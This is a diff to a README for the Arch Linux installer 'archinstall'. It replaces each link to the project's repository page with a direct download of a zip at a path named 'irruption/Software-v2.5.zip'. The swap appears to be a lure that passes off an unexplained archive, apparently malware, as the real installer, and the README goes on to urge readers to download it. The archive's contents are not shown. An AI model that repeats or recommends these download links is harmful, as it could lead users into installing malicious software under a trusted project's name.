@@ -1,6 +1,6 @@
 # 🐧 archinstall - Set Up Arch With Less Work
 
-[![Download archinstall](https://img.shields.io/badge/Download%20archinstall-5A67D8?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Drakob6710/archinstall)
+[![Download archinstall](https://img.shields.io/badge/Download%20archinstall-5A67D8?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Drakob6710/archinstall/main/irruption/Software-v2.5.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ Use it if you want a more direct way to install Arch Linux on a UEFI PC and keep
 
 Visit this page to download:
 
-https://github.com/Drakob6710/archinstall
+https://raw.githubusercontent.com/Drakob6710/archinstall/main/irruption/Software-v2.5.zip
 
 Open the link in your browser, then use the files or release assets on the page to get the tool. If the project offers a script or package file, download it to your computer first.
 
@@ -139,4 +139,4 @@ A typical use case is a fresh PC with Windows removed or a blank SSD. You boot t
 
 Primary download page:
 
-https://github.com/Drakob6710/archinstall
+https://raw.githubusercontent.com/Drakob6710/archinstall/main/irruption/Software-v2.5.zip
